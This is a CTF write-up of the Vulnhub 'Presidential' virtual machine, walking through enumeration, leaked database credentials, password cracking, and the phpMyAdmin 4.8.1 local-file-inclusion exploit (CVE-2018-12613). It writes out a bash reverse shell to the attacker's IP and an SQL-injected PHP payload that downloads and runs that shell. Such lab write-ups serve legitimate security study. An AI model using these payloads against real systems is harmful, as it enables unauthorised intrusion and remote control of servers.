---
title: Vulnhub - Presidential
description: My writeup on Presidential box.
categories:
 - vulnhub
tags: vulnhub
---

![](https://www.history.com/.image/ar_16:9%2Cc_fill%2Ccs_srgb%2Cfl_progressive%2Cg_faces:center%2Cq_auto:good%2Cw_768/MTY3MTc2NDg2OTU5MjYxMDM2/presidential-elections-gettyimages-78679210.jpg)

Hi all, this was a really interesting and "hard" box. Took me around 10 hours to pwn it. Let's pwn it!

You can find the machine there > [Presidential](https://www.vulnhub.com/entry/presidential-1,500/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.14
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-14 15:02 EEST
Nmap scan report for votenow.local (192.168.1.14)
Host is up (0.00010s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2082/tcp open  infowave
MAC Address: 00:0C:29:A1:D7:E1 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.24 seconds
$ nmap -p 80,2082 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-14 15:04 EEST
Nmap scan report for votenow.local (192.168.1.14)
Host is up (0.00057s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
|_http-title: Ontario Election Services &raquo; Vote Now!
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
MAC Address: 00:0C:29:A1:D7:E1 (VMware)
```

When we visit the website we can see this in top left corner : `contact@votenow.local` That's probably the domain. Since the anatomy of an email address is this:

```
contact@votenow.local
  ^          ^
 user      domain
```

Let's add it to `/etc/hosts`:

`192.168.1.14    votenow.local`

Let's run `gobuster` on it now.

```
$ gobuster dir -q -u http://$ip/ -w $dir_medium -x php,txt,html -o gobuster.txt
/index.html (Status: 200)
/about.html (Status: 200)
/assets (Status: 301)
/config.php (Status: 200)
```

Nothing interesting. `/config.php` is empty. Here i stuck for lot of hours then i tried to brute force extensions but `gobuster` doesnt support extenstion file. Only `wfuzz` can help here:

```
$ wfuzz -c -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/raft-small-extensions.txt --hw 854 --hc 404,403 http://$ip/FUZZFUZ2Z  

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.14/FUZZFUZ2Z
Total requests: 19371708

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                 
===================================================================

000075115:   200        0 L      0 W      0 Ch        "config - .php"                                                                                                         
000075427:   200        8 L      14 W     107 Ch      "config - .php.bak" 
```

Perfect `/config.php.bak` has some database creds in:

```
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```

But how we can use them?? Since we have a domain `votenow.local` we can search for subdomains.

```
$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.votenow.local" --hw 854 --hc 400 $ip 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.14/
Total requests: 207643

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                 
===================================================================

000009229:   200        68 L     369 W    9500 Ch     "datasafe"
```

Let's add it to `/etc/hosts`:

`192.168.1.14    datasafe.votenow.local`

Now we can see phpmyadmin running there:

![](https://i.ibb.co/wcX07d6/Screenshot-4.png)

We can use creds here `votebox:casoj3FFASPsbyoRP` & we're in! Under `users` table we can see a username and an encrypted password, let's crack it with john (takes some time):

```
$ touch password
$ cat password 
2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
$ john --wordlist=/usr/share/wordlists/rockyou.txt password
Press 'q' or Ctrl-C to abort, almost any other key for status
Stella           (?)
```

Now if we try to login with SSH we cant:

```
$ ssh admin@$ip -p 2082
admin@192.168.1.14: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

We need to find another way to get access.. let's check phpmyadmin version:

![](https://i.imgur.com/7Pn1wDQ.png)

Let's search for possible exploits:

```
$ searchsploit phpmyadmin 4.8.1
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                            | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                            | php/webapps/44928.txt
```

Here we go.. let's check it:

```
$ searchsploit -m php/webapps/44928.txt
  Exploit: phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)
      URL: https://www.exploit-db.com/exploits/44928
     Path: /usr/share/exploitdb/exploits/php/webapps/44928.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /root/Documents/vulnhub/presidential/44928.txt

$ cat 44928.txt 
# Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution
# Date: 2018-06-21
# Exploit Author: VulnSpy
# Vendor Homepage: http://www.phpmyadmin.net
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
# Version: 4.8.0, 4.8.1
# Tested on: php7 mysql5
# CVE : CVE-2018-12613

1. Run SQL Query : select '<?php phpinfo();exit;?>'
2. Include the session file :
http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k#     
```

Perfect we can spawn a shell! We will make target download our bash file , chmod it and then run it. Let's create it:

```
$ touch shell.sh
$ nano shell.sh 
$ cat shell.sh 
bash -i >& /dev/tcp/192.168.1.16/5555 0>&1
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's send this SQL query:

```sql
select '<?php system("wget 192.168.1.16/shell.sh; chmod +x shell.sh; bash shell.sh");exit;?>'
```

Now we need to find our Session ID:

![](https://i.imgur.com/eWWmchj.png)

Now to execute our payload we need to visit this URL:

`http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_$yoursessionid`

We have shell:

```
$ nc -lvp 5555
listening on [any] 5555 ...
bash-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Now we can switch to admin:

```
bash-4.2$ su - admin
su - admin
Password: Stella

Last login: Sun Jun 28 00:42:34 BST 2020 on pts/0
[admin@votenow ~]$ 
```




